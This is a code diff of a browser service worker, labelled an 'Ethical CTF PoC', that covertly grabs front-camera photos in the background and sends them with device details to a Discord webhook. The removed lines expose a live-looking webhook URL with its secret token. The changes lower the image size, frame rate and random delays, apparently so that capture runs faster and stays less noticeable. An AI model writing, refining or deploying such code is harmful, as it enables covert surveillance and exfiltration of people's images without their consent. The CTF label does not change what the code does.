@@ -2,22 +2,21 @@ self.addEventListener('message', async event => {
     if (event.data.action !== 'startBackgroundCapture') return;
 
     // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws.
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
+    const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with actual webhook URL
 
     async function sendItem(type, data, index = null) {
         try {
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
                 embeds: [{
-                    title: `Zero-Click CTF: ${type} [${new Date().toISOString()}]`,
+                    title: `Zero-Click CTF: ${type}`,
                     fields: [
                         { name: 'Type', value: type },
                         { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                         { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                         { name: 'Device', value: navigator.userAgent || 'ServiceWorker' },
-                        { name: 'Browser', value: `${navigator.vendor || 'Unknown'} ${navigator.appVersion || 'Unknown'}` }
+                        { name: 'Time', value: new Date().toISOString()
                     ],
-                    timestamp: new Date().toISOString(),
                     footer: { text: 'Ethical CTF PoC - Do not misuse' }
                 }]
             }));
@@ -46,18 +45,18 @@ self.addEventListener('message', async event => {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
-                    width: { ideal: 160 },
-                    height: { ideal: 120 },
-                    frameRate: { ideal: 8 }
+                    width: { ideal: 128 },
+                    height: { ideal: 96 },
+                    frameRate: { ideal: 5 }
                 },
                 audio: false 
             });
             const track = stream.getVideoTracks()[0];
             const imageCapture = new ImageCapture(track);
             const bitmap = await imageCapture.grabFrame();
-            const canvas = new OffscreenCanvas(160, 120);
+            const canvas = new OffscreenCanvas(128, 96);
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(bitmap, 0, 0, 160, 120);
+            ctx.drawImage(bitmap, 0, 0, 128, 96);
             const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
             const reader = new FileReader();
             const photo = await new Promise(resolve => {
@@ -82,7 +81,7 @@ self.addEventListener('message', async event => {
         await new Promise(resolve => setTimeout(async () => {
             await capturePhoto(i);
             resolve();
-        }, i * interval + Math.random() * 100));
+        }, i * interval + Math.random() * 20));
     }
 
     await sendItem('Status', { message: 'Background 8 photos captured successfully' });
